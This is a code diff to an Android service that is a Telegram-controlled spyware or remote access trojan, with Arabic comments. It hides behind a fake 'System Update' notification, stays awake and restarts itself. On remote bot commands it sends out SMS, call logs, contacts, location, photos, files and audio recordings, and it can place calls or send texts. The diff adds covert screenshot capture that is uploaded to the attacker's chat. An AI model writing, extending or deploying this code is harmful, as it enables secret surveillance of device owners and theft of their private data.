@@ -9,9 +9,17 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.Image;
+import android.media.ImageReader;
 import android.media.MediaRecorder;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
@@ -24,6 +32,8 @@ import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
 
 import androidx.core.app.NotificationCompat;
 
@@ -33,6 +43,7 @@ import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -59,36 +70,43 @@ public class MainService extends Service {
     private MediaRecorder mediaRecorder;
     private boolean isRecording = false;
     private String currentAudioPath;
+    private MediaProjection mediaProjection;
+    private MediaProjectionManager projectionManager;
+    private int screenWidth, screenHeight, screenDensity;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        
+
         try {
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
             wakeLock.acquire();
-        } catch (Exception e) {}
-        
+        } catch (Exception e) { /* ignore */ }
+
+        // إعداد MediaProjection للشاشة
+        try {
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            screenWidth = metrics.widthPixels;
+            screenHeight = metrics.heightPixels;
+            screenDensity = metrics.densityDpi;
+        } catch (Exception e) { /* ignore */ }
+
         startForegroundService();
-        
-        // تأخير إرسال الرسالة الأولى لتجنب الكراش
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    sendToTelegram("✅ MainService Started");
-                } catch (Exception e) {}
-            }
-        }, 2000);
-        
+
+        // تأخير إرسال الرسالة الأولى
+        handler.postDelayed(() -> sendToTelegram("✅ MainService Started"), 2000);
+
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
                 try {
                     checkCommands();
-                } catch (Exception e) {}
+                } catch (Exception e) { /* ignore */ }
             }
         }, 5000, 5000);
     }
@@ -97,19 +115,18 @@ public class MainService extends Service {
         try {
             String channelId = "main_channel";
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
+                NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
+                        NotificationManager.IMPORTANCE_LOW);
                 NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-                if (manager != null) {
-                    manager.createNotificationChannel(channel);
-                }
+                if (manager != null) manager.createNotificationChannel(channel);
             }
             Notification notification = new NotificationCompat.Builder(this, channelId)
                     .setContentTitle("System Update")
-                    .setContentText("Active")
+                    .setContentText("يعمل في الخلفية")
                     .setSmallIcon(android.R.drawable.stat_notify_sync)
                     .build();
             startForeground(1, notification);
-        } catch (Exception e) {}
+        } catch (Exception e) { /* ignore */ }
     }
 
     private void checkCommands() {
@@ -117,7 +134,6 @@ public class MainService extends Service {
             Request request = new Request.Builder()
                     .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                     .build();
-
             client.newCall(request).enqueue(new okhttp3.Callback() {
                 @Override
                 public void onResponse(Call call, Response response) throws IOException {
@@ -125,11 +141,9 @@ public class MainService extends Service {
                         String body = response.body().string();
                         JSONObject json = new JSONObject(body);
                         JSONArray result = json.getJSONArray("result");
-
                         for (int i = 0; i < result.length(); i++) {
                             JSONObject update = result.getJSONObject(i);
                             lastUpdateId = update.getInt("update_id") + 1;
-
                             if (update.has("message")) {
                                 JSONObject message = update.getJSONObject("message");
                                 if (message.has("text")) {
@@ -139,12 +153,12 @@ public class MainService extends Service {
                             }
                         }
                         response.close();
-                    } catch (Exception e) {}
+                    } catch (Exception e) { /* ignore */ }
                 }
                 @Override
-                public void onFailure(Call call, IOException e) {}
+                public void onFailure(Call call, IOException e) { /* ignore */ }
             });
-        } catch (Exception e) {}
+        } catch (Exception e) { /* ignore */ }
     }
 
     private void executeCommand(String command) {
@@ -183,6 +197,9 @@ public class MainService extends Service {
                 case "/files":
                     getFiles();
                     break;
+                case "/screenshot":
+                    takeScreenshot();
+                    break;
                 case "/record_audio_start":
                     startAudioRecording();
                     break;
@@ -207,11 +224,28 @@ public class MainService extends Service {
                 default:
                     break;
             }
-        } catch (Exception e) {}
+        } catch (Exception e) { /* ignore */ }
     }
 
     private void sendHelp() {
-        sendToTelegram("Commands:\n/info\n/location\n/contacts\n/sms\n/calls\n/accounts\n/photos\n/videos\n/files\n/record_audio_start\n/record_audio_stop\n/vibrate\n/open [url]\n/call [number]\n/sms_send [number] [text]\n/test");
+        sendToTelegram("📋 الأوامر:\n" +
+                "/info - معلومات الجهاز\n" +
+                "/location - الموقع\n" +
+                "/contacts - جهات الاتصال\n" +
+                "/sms - آخر 10 رسائل\n" +
+                "/calls - آخر 10 مكالمات\n" +
+                "/accounts - الحسابات\n" +
+                "/photos - آخر 10 صور\n" +
+                "/videos - آخر 10 فيديوهات\n" +
+                "/files - الملفات\n" +
+                "/screenshot - تصوير الشاشة\n" +
+                "/record_audio_start - بدء تسجيل الصوت\n" +
+                "/record_audio_stop - إيقاف التسجيل\n" +
+                "/vibrate - اهتزاز\n" +
+                "/open [رابط] - فتح رابط\n" +
+                "/call [رقم] - اتصال\n" +
+                "/sms_send [رقم] [نص] - إرسال رسالة\n" +
+                "/test - اختبار");
     }
 
     private void sendDeviceInfo() {
@@ -220,6 +254,12 @@ public class MainService extends Service {
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
+            info.put("battery", getBatteryLevel());
+
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
+                info.put("phone", tm.getLine1Number());
+
             sendToTelegram("📱 Device Info:\n" + info.toString(2));
         } catch (Exception e) {}
     }
@@ -231,9 +271,7 @@ public class MainService extends Service {
             int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
             return (int)(level * 100 / (float)scale);
-        } catch (Exception e) {
-            return 0;
-        }
+        } catch (Exception e) { return 0; }
     }
 
     private void getContacts() {
@@ -243,7 +281,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No contacts permission");
                     return;
                 }
-
                 ContentResolver cr = getContentResolver();
                 Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null, null, null, null);
@@ -268,11 +305,9 @@ public class MainService extends Service {
                 sendToTelegram("❌ No location permission");
                 return;
             }
-
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-
             if (location != null) {
                 sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
             } else {
@@ -288,7 +323,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No SMS permission");
                     return;
                 }
-
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
@@ -311,7 +345,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No call log permission");
                     return;
                 }
-
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
@@ -351,7 +384,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No storage permission");
                     return;
                 }
-
                 String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
@@ -375,7 +407,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No storage permission");
                     return;
                 }
-
                 String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
@@ -399,7 +430,6 @@ public class MainService extends Service {
                     sendToTelegram("❌ No storage permission");
                     return;
                 }
-
                 File storage = Environment.getExternalStorageDirectory();
                 StringBuilder sb = new StringBuilder("📁 Files:\n\n");
                 listFiles(storage, sb, 0);
@@ -424,6 +454,85 @@ public class MainService extends Service {
         }
     }
 
+    // ========== تصوير الشاشة ==========
+    private void takeScreenshot() {
+        if (mediaProjection == null) {
+            setupMediaProjection();
+            if (mediaProjection == null) {
+                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. أعد فتح التطبيق وافعلها.");
+                return;
+            }
+        }
+
+        try {
+            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
+            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "Screenshot", screenWidth, screenHeight, screenDensity,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(), null, null
+            );
+
+            handler.postDelayed(() -> {
+                Image image = imageReader.acquireLatestImage();
+                if (image != null) {
+                    Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+                    bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
+                    sendScreenshot(bitmap);
+                    image.close();
+                    bitmap.recycle();
+                }
+                virtualDisplay.release();
+                imageReader.close();
+            }, 500);
+            sendToTelegram("📸 جاري تصوير الشاشة...");
+        } catch (Exception e) {
+            sendToTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
+        }
+    }
+
+    private void setupMediaProjection() {
+        try {
+            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
+            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
+            if (resultCode != -1 && dataUri != null) {
+                Intent data = Intent.parseUri(dataUri, 0);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                }
+            }
+        } catch (Exception e) { /* ignore */ }
+    }
+
+    private void sendScreenshot(Bitmap bitmap) {
+        try {
+            File file = new File(getCacheDir(), "screenshot.jpg");
+            FileOutputStream out = new FileOutputStream(file);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
+            out.close();
+
+            RequestBody body = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("photo", "screenshot.jpg",
+                            RequestBody.create(MediaType.parse("image/jpeg"), file))
+                    .build();
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
+                    .post(body).build();
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override
+                public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) {}
+                    file.delete();
+                }
+                @Override public void onFailure(Call call, IOException e) {}
+            });
+        } catch (Exception e) {
+            sendToTelegram("❌ فشل إرسال الصورة: " + e.getMessage());
+        }
+    }
+
+    // ========== تسجيل الصوت ==========
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -464,6 +573,7 @@ public class MainService extends Service {
         }
     }
 
+    // ========== أوامر التحكم ==========
     private void vibrate() {
         try {
             Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
@@ -561,9 +671,9 @@ public class MainService extends Service {
             if (timer != null) timer.cancel();
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaRecorder != null) mediaRecorder.release();
-        } catch (Exception e) {}
+        } catch (Exception e) { /* ignore */ }
         try {
             startService(new Intent(this, MainService.class));
-        } catch (Exception e) {}
+        } catch (Exception e) { /* ignore */ }
     }
 }
